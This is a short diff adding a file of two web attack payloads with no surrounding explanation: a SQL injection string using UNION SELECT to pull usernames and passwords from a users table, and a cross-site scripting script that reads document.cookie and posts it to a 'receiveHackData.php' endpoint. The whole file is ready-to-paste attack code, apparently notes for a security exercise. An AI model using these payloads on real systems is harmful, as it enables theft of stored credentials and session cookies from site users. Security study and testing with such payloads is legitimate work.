@@ -1,0 +1,9 @@
+SQL Injection
+' UNION SELECT id,username , password , 'a' , 'a' , 'a' from users;#
+
+XSS 
+<script>const data = document.cookie;fetch("/receiveHackData.php", {method: "POST",headers: {
+"Content-Type": "application/json"},body: JSON.stringify({ key1: data })})</script>
+
+
+
